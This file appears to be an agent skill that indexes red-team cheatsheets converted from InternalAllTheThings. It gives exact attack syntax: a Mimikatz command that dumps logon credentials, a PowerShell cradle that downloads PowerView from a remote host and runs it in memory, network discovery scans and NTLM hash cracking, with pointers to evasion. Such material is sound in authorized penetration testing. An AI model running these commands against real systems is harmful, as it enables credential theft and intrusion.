---
name: security-cheatsheets
description: >-
  Quick command references for internal and red team work: Mimikatz modules, PowerShell one-liners
  and download cradles, network host discovery, hash cracking with Hashcat and John, kiosk escape
  and jail breakout, Liferay, AS/400 and miscellaneous Windows/Linux tricks. Use when you need
  exact syntax fast for a tool, a discovery command, a hashcat mode, or an escape technique.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "8"
  generated-by: build/build.py
---

# Security Command Cheatsheets

Exact-syntax lookup for the commands that recur across internal and red team work: Mimikatz
modules, PowerShell execution and download cradles, host and network discovery, hash cracking,
Windows kiosk escape, Liferay, AS/400 and a handful of Windows/Linux tricks. Use it when you know
*what* you want to do and need the *exact* flag, module or payload — not when you need a
methodology (use the phase skills for that).

## When to use this skill

- You need the exact Mimikatz command or module for a credential target (logonpasswords, dpapi, pth, golden ticket).
- You need a PowerShell download cradle, encoded command, or reflective assembly load.
- You need a discovery command for a protocol (ARP, NBT-NS, DHCP, mDNS, LDAP, SMB) or a scan pattern.
- You hold a hash and need the right hashcat/john invocation and mode.
- You are at a locked-down kiosk or jail and need an escape primitive.
- Liferay or AS/400 is in scope and you need enumeration or default-credential commands.

## First moves

1. **Classify what you hold before opening a file**: credential in memory → Mimikatz; a Windows
   command line → PowerShell; an unknown network → discovery; a hash → cracking; physical console →
   kiosk escape.
2. **Mimikatz, one shot** (local admin required):
   ```powershell
   .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
   ```
   Empty `sekurlsa::` output usually means SeDebugPrivilege was refused or LSA protection is on.
3. **PowerShell download cradle** (in-memory, no disk):
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
   ```
4. **Host and network discovery**:
   ```bash
   nmap -sn -n 192.168.1.0/24
   sudo nmap -sSV -p- 192.168.0.1 -oA scan -T4
   nbtscan -r 192.168.1.0/24
   ```
5. **Crack what you have** — identify the type first, then:
   ```bash
   hashcat -m 1000 --status --status-timer 300 -w 4 -O hashes.txt wordlist.txt
   ```
   `-m 1000` is NTLM (the mode used throughout the reference's mask examples); confirm any other
   type against the hashcat example-hashes page before committing to a long run.
6. **Kiosk or jail escape**: enumerate the escape surface (sticky keys, dialog boxes, context
   menus, explorer) — this assumes physical/console access.

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [mimikatz.md](references/mimikatz.md) | extracting credentials, PTH, golden ticket, DPAPI, LSA protection | `sekurlsa::`, `lsadump::`, `kerberos::`, dpapi, vault, Chrome cookies, module reference table |
| [powershell.md](references/powershell.md) | execution policy, constrained mode, encoded commands, reflective load, Win32 calls | IEX cradles, base64, assembly load, API via reflection, shellcode runners |
| [network-discovery.md](references/network-discovery.md) | an unknown network, protocol discovery, port scanning | MAC/DHCP/DNS/NBT-NS/mDNS/ARP/ping/LDAP, nmap scan patterns |
| [hash-cracking.md](references/hash-cracking.md) | hashcat/john usage, masks, rules, wordlists | `-m` modes, `-a` attacks, rule files, loopback, cloud cracking rigs |
| [kiosk-escape-breakout.md](references/kiosk-escape-breakout.md) | locked-down Windows kiosk, jail | tools, methodology, sticky keys, dialogs, explorer, context menus |
| [liferay.md](references/liferay.md) | Liferay portal in scope | portlets, login/register, user profile, control panel, API |
| [as-400.md](references/as-400.md) | AS/400 (IBM i) in scope | enumeration, default credentials, `*ALLOBJ`/`*SECADM`, user class, adopted authority, password cracking |
| [miscellaneous-tricks.md](references/miscellaneous-tricks.md) | messaging logged-on users, NetExec credential database | `msg`/`net send`, NetExec creds |

## Workflow

Route by what you hold, then return to the phase skill that sent you here:

- **Credential material** (memory, registry, dump) → `mimikatz.md`; anything still hashed →
  `hash-cracking.md`.
- **A Windows command line** → `powershell.md` (cradle, encoded command, constrained-language bypass).
- **An IP with no context** → `network-discovery.md`: discovery first, targeted nmap second.
- **Physical access** to a kiosk or jail → `kiosk-escape-breakout.md`.
- **A legacy application** (Liferay, AS/400) → its own file; AS/400 default credentials are a
  common finding in older estates.

## Gotchas

- **Mimikatz needs SeDebugPrivilege.** If `privilege::debug` fails, `sekurlsa::` silently returns
  nothing. LSA protection/PPL requires the mimidriver approach.
- **Mimikatz and cradles are heavily signatured.** AMSI/Defender may block the cradle before your
  code runs — see `redteam-defense-evasion`.
- **`sekurlsa::minidump lsass.dmp`** processes an offline dump instead of touching the live process;
  use it when live access is denied or noisy.
- **Hashcat**: a wrong `-m` wastes hours; `-O` caps password length, `-w 4` is aggressive,
  `--loopback` keeps cracking with new rules, and rules often beat raw masks.
- **AS/400** default-credential checks require `*ALLOBJ` and `*SECADM` special authorities.
- **Kiosk escape is not remote** — it assumes console or physical access.

## Authorized use

For authorized engagements only, within the agreed scope and the law.

## Source

Converted from the upstream InternalAllTheThings cheatsheets —
https://github.com/swisskyrepo/InternalAllTheThings — see NOTICE.md.
